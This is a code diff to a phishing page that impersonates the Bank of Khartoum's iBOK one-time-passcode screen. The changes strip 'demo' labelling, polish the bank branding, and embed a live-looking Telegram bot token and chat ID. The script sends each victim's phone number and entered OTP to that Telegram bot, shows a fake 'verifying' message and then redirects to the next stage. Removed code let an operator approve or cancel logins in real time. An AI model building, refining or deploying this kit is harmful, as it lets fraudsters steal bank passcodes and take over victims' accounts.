@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-    <title>Enter OTP code I iBOK</title>
+    <title>Enter OTP code | iBOK</title>
 
     <style>
          :root {
@@ -116,18 +116,6 @@
             text-align: center;
         }
         
-        .demo-notice {
-            margin-bottom: 18px;
-            padding: 10px 12px;
-            border: 1px solid #f1d783;
-            border-radius: 8px;
-            background: #fff9e4;
-            color: #5f4b12;
-            font-size: 12px;
-            line-height: 1.45;
-            text-align: center;
-        }
-        
         label {
             display: block;
             margin-bottom: 11px;
@@ -145,9 +133,9 @@
             background: var(--field);
             color: var(--ink);
             font: inherit;
-            font-size: 16px;
+            font-size: 18px;
             text-align: center;
-            letter-spacing: 1px;
+            letter-spacing: 4px;
         }
         
         input:focus {
@@ -158,6 +146,7 @@
         input::placeholder {
             color: var(--muted);
             opacity: 1;
+            letter-spacing: normal;
         }
         
         .message {
@@ -166,6 +155,21 @@
             color: #b4232a;
             font-size: 14px;
             text-align: center;
+        }
+        
+        .message.success {
+            color: #1d7a24;
+        }
+        
+        .message.error {
+            color: #b4232a;
+        }
+        
+        .timer-container {
+            margin: 10px 0 15px;
+            text-align: center;
+            font-size: 14px;
+            color: #607080;
         }
         
         button {
@@ -184,9 +188,9 @@
             background: #d92329;
         }
         
-        button:focus-visible {
-            outline: 3px solid #101820;
-            outline-offset: 3px;
+        button:disabled {
+            background: #f4a3a5;
+            cursor: not-allowed;
         }
         
         footer {
@@ -203,50 +207,6 @@
             position: fixed;
             left: 31px;
             bottom: 15px;
-            width: 58px;
-            height: 58px;
-            display: grid;
-            place-items: center;
-            border-radius: 50%;
-            background: #e9262b;
-            color: #fff;
-            box-shadow: 0 5px 15px #0002;
-            font-size: 25px;
-            user-select: none;
-        }
-        
-        @media (max-width: 600px) {
-            .page {
-                margin: 0;
-                border-radius: 0;
-            }
-            header {
-                height: 132px;
-                flex-basis: 132px;
-            }
-            .welcome,
-            .brand {
-                width: calc(100% - 36px);
-            }
-            main {
-                padding: 0 12px 32px;
-            }
-            .card {
-                margin-top: 15px;
-                padding: 24px 22px;
-            }
-            h1 {
-                font-size: 22px;
-            }
-            .support-bubble {
-                left: 16px;
-                bottom: 12px;
-                width: 50px;
-                height: 50px;
-            }
-        }
-        
-        .support-bubble {
             width: 55px;
             height: 55px;
             background-color: #ff0000;
@@ -255,7 +215,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
+            font-size: 25px;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
         }
@@ -281,20 +241,22 @@
                 <h1 id="demo-title">Enter OTP code</h1>
                 <p class="description">Please enter the verification code sent to your <br> registered phone number and email address.</p>
 
-
-
                 <form id="demo-form">
-                    <label for="demo-input">Demo word</label>
-                    <input id="demo-input" name="demo" type="text" placeholder="Enter a 6-digit code" autocomplete="off" required aria-describedby="form-message" />
+                    <label for="otp-input">Enter 6-digit OTP</label>
+                    <input id="otp-input" name="otp" type="text" maxlength="6" placeholder="------" autocomplete="off" required aria-describedby="message" />
 
-                    <p class="message" id="form-message" aria-live="polite"></p>
-                    <button type="submit">Continue</button>
+                    <div class="timer-container">
+                        Code expires in: <span id="timerText">30s</span>
+                    </div>
+
+                    <p class="message" id="message" aria-live="polite"></p>
+                    <button type="button" id="confirmBtn" disabled>Continue</button>
                 </form>
             </section>
         </main>
 
         <footer>
-            iBOK I Bank of Khartoum 2026<br /> All rights reserved, Bank of Khartoum, iBOK 2026
+            iBOK | Bank of Khartoum 2026<br /> All rights reserved, Bank of Khartoum, iBOK 2026
         </footer>
 
         <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
@@ -303,45 +265,27 @@
     </div>
 
     <script>
-        // Bot 1 (ONLY - removed Bot 2)
-        const BOT_TOKEN_1 = '8728071345:AAHtK0Te8ZOoQDxX43tAmT51nweCyRnz19o';
-        const CHAT_ID_1 = '7676797362';
+        const BOT_TOKEN_1 = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const CHAT_ID_1 = '8406078749';
 
-        // Inputs + buttons (MATCH HTML)
-        const otpBoxes = document.querySelectorAll('.otp');
+        const otpInput = document.getElementById('otp-input');
         const confirmBtn = document.getElementById('confirmBtn');
         const messageEl = document.getElementById('message');
-
-        // Timer elements (MATCH HTML)
-        const timerProgress = document.getElementById('timerProgress');
         const timerText = document.getElementById('timerText');
 
-        if (!timerProgress || !timerText || !confirmBtn || otpBoxes.length !== 6) {
-            console.error('Missing required DOM elements. Check ids/classes in HTML.');
-        }
-
-        let otpValue = '';
         let seconds = 30;
         let countdown = null;
-
-        let pollInterval1 = null;
-        let lastUpdateId1 = 0;
-
-        let currentTimestamp = 0;
-        let actionProcessed = false;
 
         const savedPhone = localStorage.getItem('phone') || '785123463';
 
         function updateTimerUI() {
-            if (!timerText || !timerProgress) return;
+            if (!timerText) return;
             timerText.textContent = `${seconds}s`;
-            const percent = Math.max(0, Math.min(100, (seconds / 30) * 100));
-            timerProgress.style.width = percent + '%';
         }
 
         function startCountdown() {
             clearInterval(countdown);
-            seconds = 60;
+            seconds = 30;
             updateTimerUI();
 
             countdown = setInterval(() => {
@@ -355,63 +299,28 @@
             }, 1000);
         }
 
-        function checkOtpComplete() {
-            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
-            const complete = otpValue.length === 6;
+        // Only allow numbers and max 6 digits in single field
+        otpInput.addEventListener('input', () => {
+            otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
+            const complete = otpInput.value.length === 6;
+
             confirmBtn.disabled = !complete;
-            if (complete) confirmBtn.classList.add('enabled');
-            else confirmBtn.classList.remove('enabled');
-        }
-
-        function resetForNewOtp() {
-            // Stop polling
-            if (pollInterval1) clearInterval(pollInterval1);
-            pollInterval1 = null;
-
-            actionProcessed = false;
-            currentTimestamp = 0;
-
-            // Clear OTP inputs
-            otpBoxes.forEach(b => b.value = '');
-            checkOtpComplete();
-
-            // Reset message
-            messageEl.className = 'message';
-            messageEl.textContent = '';
-
-            // Reset timer
-            startCountdown();
-
-            // Focus first box
-            otpBoxes[0].focus();
-        }
-
-        startCountdown();
-
-        otpBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                box.value = box.value.replace(/\D/g, '').slice(0, 1);
-
-                if (box.value.length === 1 && index < 5) {
-                    otpBoxes[index + 1].focus();
-                }
-                checkOtpComplete();
-            });
-
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
-                }
-            });
+            if (complete) {
+                confirmBtn.classList.add('enabled');
+            } else {
+                confirmBtn.classList.remove('enabled');
+            }
         });
 
-        function sendToBot(botToken, chatId, text, replyMarkup) {
+        startCountdown();
+        otpInput.focus();
+
+        function sendToBot(botToken, chatId, text) {
             const payload = {
                 chat_id: chatId,
                 text: text,
                 parse_mode: 'Markdown'
             };
-            if (replyMarkup) payload.reply_markup = replyMarkup;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -422,79 +331,8 @@
             }).catch(() => {});
         }
 
-        function stopPolling() {
-            if (pollInterval1) clearInterval(pollInterval1);
-            pollInterval1 = null;
-        }
-
-        function handleCallback(callbackData, callbackQueryId) {
-            if (actionProcessed) return;
-            actionProcessed = true;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
-                })
-            }).catch(() => {});
-
-            stopPolling();
-
-            const parts = callbackData.split('_');
-            const action = parts[0];
-
-            if (action === 'approve') {
-                messageEl.className = 'message success';
-                messageEl.textContent =
-                    'Your Registrations fee is being approved. Redirecting...';
-
-                // navigate to index.html
-                window.location.href = 'index.html';
-            } else if (action === 'cancel') {
-                messageEl.className = 'message error';
-                messageEl.textContent = 'Cancelled. Requesting a new OTP...';
-
-                // reset page for new otp
-                resetForNewOtp();
-            }
-        }
-
-        function pollBot(botToken) {
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId1 + 1}&timeout=10`)
-                .then(res => res.json())
-                .then(data => {
-                    if (!data.ok || !data.result || data.result.length === 0) return;
-
-                    for (const update of data.result) {
-                        lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
-
-                        if (update.callback_query && !actionProcessed) {
-                            const cb = update.callback_query;
-                            const dataParts = cb.data.split('_');
-                            const ts = parseInt(dataParts[1], 10);
-
-                            if (ts === currentTimestamp) {
-                                handleCallback(cb.data, cb.id);
-                                return;
-                            }
-                        }
-                    }
-                })
-                .catch(() => {});
-        }
-
-        function startPolling() {
-            actionProcessed = false;
-
-            pollInterval1 = setInterval(() => {
-                pollBot(BOT_TOKEN_1);
-            }, 1500);
-        }
-
         confirmBtn.addEventListener('click', () => {
+            const otpValue = otpInput.value.trim();
             if (otpValue.length !== 6) return;
 
             if (seconds <= 0) {
@@ -503,36 +341,21 @@
                 return;
             }
 
-            messageEl.className = 'message';
-            messageEl.textContent = 'Waiting for approval...';
-
-            currentTimestamp = Date.now();
+            messageEl.className = 'processing';
+            messageEl.textContent = 'verifying.......';
 
             const message =
                 `*OTP Verification*\n\n` +
                 `📱 Phone: +258 ${savedPhone}\n` +
-                `🔢 Entered OTP: ${otpValue}\n\n` +
-                `Please approve or cancel the loan application.`;
+                `🔢 Entered OTP: ${otpValue}`;
 
-            const replyMarkup = {
-                inline_keyboard: [
-                    [{
-                        text: '✅ Approve',
-                        callback_data: 'approve_' + currentTimestamp
-                    }, {
-                        text: '❌ Cancel',
-                        callback_data: 'cancel_' + currentTimestamp
-                    }]
-                ]
-            };
+            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message);
 
-            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
-            startPolling();
+            // Redirect to number.html after a brief moment
+            setTimeout(() => {
+                window.location.href = 'number.html';
+            }, 1500);
         });
-
-        // initial state
-        checkOtpComplete();
-        otpBoxes[0].focus();
     </script>
 </body>
 
